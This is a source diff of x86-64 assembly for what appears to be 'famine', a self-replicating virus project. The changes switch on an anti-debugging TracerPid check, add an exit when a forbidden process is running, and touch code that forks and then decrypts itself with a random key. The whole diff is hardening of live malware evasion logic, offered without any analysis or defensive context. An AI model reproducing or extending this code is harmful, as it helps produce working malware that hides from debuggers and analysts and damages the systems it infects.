@@ -5,7 +5,6 @@ global  _start                              ;must be declared for linker (ld)
 
 _start:   ;Entry-Point
 PUSH
-
 mov rbp, rsp
 sub rbp, famine_size  ; reserve famine_size bytes on the stack
 
@@ -39,7 +38,7 @@ loop .loop_status
 .check_trcr:
 add r12, 12
 cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
-;jne _exx_pop
+jne _exx_pop
 
 
 
@@ -118,30 +117,31 @@ mov rdx, 0
 	mov byte[rsi + r10], 0
 
 ;open the commfile
-	push rsi
 	xor rsi, rsi
 	mov rax, _open
 	lea rdi, STACK(famine.commpath)
 	mov rdx, O_RDWR
 	syscall
-	pop rsi
 	test eax, eax
 	jl .nextfile_proc
 
 ;read the commfile
+	push rax
 	mov rdi, rax
 	mov rax, _read
 	lea rsi, STACK(famine.commpath)
 	mov rdx, 90
 	syscall
+	pop r9
 	test eax, eax
 	jl .close_proc
 	mov byte[rsi + rax - 1], 0x0
 	lea rdi, [rel forbidden]
 	call .strcmp
 	cmp rax, 0
-	je _exx
+	je .done
 	.close_proc:
+	mov rdi, r9
 	mov rax, _close
 	syscall
 	jmp .nextfile_proc
@@ -166,6 +166,10 @@ mov rdx, 0
 	sub rax, rbx
 	ret
 
+.done:
+	pop rdi		; this pop is required in case of Exit from strcmp cause we did a CALL in readdir_proc  and must pop its address
+	jmp _exx_pop
+
 .nextfile_proc:
 	cmp r13, r12
 	jl .read_file
@@ -180,7 +184,7 @@ DECYPHER
 .enc_start:
 	mov rax, _fork
 	syscall
-p	cmp rax, 0
+	cmp rax, 0
 	jne _exx_pop
 
 .get_rand_key:
